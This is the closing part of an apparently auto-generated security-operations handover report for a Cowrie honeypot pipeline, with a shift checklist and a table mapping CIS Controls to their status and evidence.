- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-10T19:39:21Z_
